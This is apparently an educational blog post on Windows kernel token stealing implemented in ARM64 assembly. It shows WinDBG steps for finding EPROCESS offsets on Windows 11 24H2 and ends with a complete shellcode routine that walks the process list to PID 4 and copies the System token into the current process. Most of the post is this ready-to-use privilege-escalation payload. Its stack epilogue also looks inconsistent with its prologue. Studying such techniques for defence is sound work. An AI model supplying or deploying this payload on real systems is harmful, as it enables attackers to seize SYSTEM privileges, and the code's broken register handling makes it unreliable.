# Understanding Token Stealing in Windows Kernel: An ARM64 Assembly (Shallow) Dive

Token stealing is a common windows kernel shellcode technique. Today, we'll analyze an ARM64 assembly implementation that demonstrates this technique. This is for educational purposes only, and is intended to demonstrate how token stealing can be reimplemented on other architectures.

## The Code Structure

Let's break down the key components:

### Determining Kernel Offsets

Using a WinDBG kernel debugging session, we can determine the offsets for the following structures:

```armasm
KTHREAD_OFFSET     EQU 0x988    ; Offset to current KTHREAD
EPROCESS_OFFSET    EQU 0x0B0    ; Offset to EPROCESS
ACTIVEPROCESSLINKS EQU 0x1C8    ; Offset to ActiveProcessLinks
PID_OFFSET         EQU 0x1C0    ; Offset to process ID
TOKEN_OFFSET       EQU 0x238    ; Offset to process token
```

The KTHREAD and EPROCESS offset can be obtained by disassembling `nt!PsGetCurrentProcess`.

```armasm
0: kd> uf nt!PsGetCurrentProcess
nt!PsGetCurrentProcess:
fffff803`dfee6b70 f944c648 ldr         x8,[xpr,#0x988]
fffff803`dfee6b74 f9405900 ldr         x0,[x8,#0xB0]
fffff803`dfee6b78 d65f03c0 ret
```

The `xpr` register is an alias for `x18`, a platform specific register which points to KPCR in kernel mode as per https://learn.microsoft.com/en-us/cpp/build/arm64-windows-abi-conventions?view=msvc-170.

The ACTIVEPROCESSLINKS offset is obtained by examining the EPROCESS structure.

```armasm
0: kd> !process 4 0
Searching for Process with Cid == 4
PROCESS ffffe609926a5080
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 400aa000  ObjectTable: ffffd30c54229c80  HandleCount: 2819.
    Image: System

0: kd> dt nt!_EPROCESS ffffe609926a5080 ActiveProcessLinks
   +0x1c8 ActiveProcessLinks : _LIST_ENTRY [ 0xffffe609`92721248 - 0xfffff803`e09786c0 ]
```

The same process can be used to determine the PID_OFFSET,

```armasm
0: kd> dt nt!_EPROCESS ffffe609926a5080 UniqueProcessId
   +0x1c0 UniqueProcessId  : 0x00000000`00000004 Void
```
and TOKEN_OFFSET,

```armasm
0: kd> dt nt!_EPROCESS ffffe609926a5080 Token
   +0x238 Token              : _EX_FAST_REF
```

## The Token Stealing Process

### 1. Register Preservation
The code begins by saving the `x0` and `x1` registers to the stack, since we'll be using them later:
```armasm
stp x0, x1, [sp, #-0x20]
stp x2, x3, [sp, #-0x10]
```

### 2. Locating Current Process
```armasm
ldr x0, [xpr, #0x988]    ; Get KTHREAD
ldr x0, [x0, #0xB0]      ; Get EPROCESS
```

This sequence retrieves the current process's EPROCESS structure into `x0`.

### 3. Finding System Process
The code then enters a loop to traverse the process list until it finds the System process (PID 4):
```armasm
find_system:
    add x0, x0, ACTIVEPROCESSLINKS
    ldr x0, [x0]
    sub x0, x0, ACTIVEPROCESSLINKS
    ldr w3, [x0, PID_OFFSET]
    cmp w3, w2
    b.ne find_system
```

### 4. Token Swapping
Once the System process is found, its token is copied to our current process:
```armasm
ldr x2, [x0, TOKEN_OFFSET]    ; Get System token
str x2, [x1, TOKEN_OFFSET]    ; Set token in our process
```


## Technical Notes

- The code uses ARM64's `stp`/`ldp` instructions for efficient register pairs handling
- The implementation assumes specific Windows kernel structure layouts (Windows 11 24H2)

## The Code

Below is the ARM64 assembly code for the token stealing process in armasm64 syntax.

```armasm
; Constants for Windows kernel offsets
KTHREAD_OFFSET     EQU 0x988    ; Offset to current KTHREAD
EPROCESS_OFFSET    EQU 0x0B0    ; Offset to EPROCESS
ACTIVEPROCESSLINKS EQU 0x1C8    ; Offset to ActiveProcessLinks
PID_OFFSET         EQU 0x1C0    ; Offset to process ID
TOKEN_OFFSET       EQU 0x238    ; Offset to process token

    AREA |.text|,CODE,READONLY
    ALIGN

token_stealing PROC
    ; Save registers
    stp x0, x1, [sp, #-0x20]
    stp x2, x3, [sp, #-0x10]

    ldr x0, [xpr, #0x988]
    ldr x0, [x0, #0xB0]

    mov x1, x0                    ; Save current EPROCESS in x1

    ; System process PID (4)
    mov x2, #4

find_system
    ; Get next process
    add x0, x0, ACTIVEPROCESSLINKS
    ldr x0, [x0]
    sub x0, x0, ACTIVEPROCESSLINKS    ; Adjust to get EPROCESS base

    ; Compare PID
    ldr w3, [x0, PID_OFFSET]
    cmp w3, w2
    b.ne find_system

    ; Found System process, copy token
    ldr x2, [x0, TOKEN_OFFSET]        ; Get System token
    str x2, [x1, TOKEN_OFFSET]        ; Set token in our process

    ; Restore registers
    ldp x0, x1, [sp, #0x0]
    ldp x2, x3, [sp, #0x10]
    ldp fp,lr,[sp],#0x0
    add sp, sp, #0x30
    ret
    ENDP

    END

```

## Conclusion

This post describes how token stealing can be implemented, and derived, on ARM64, and can serve as a reference on how to implement token stealing on other architectures.

The offsets used in this code are specific to Windows 11 24H2, and may need to be adjusted for other versions of Windows.
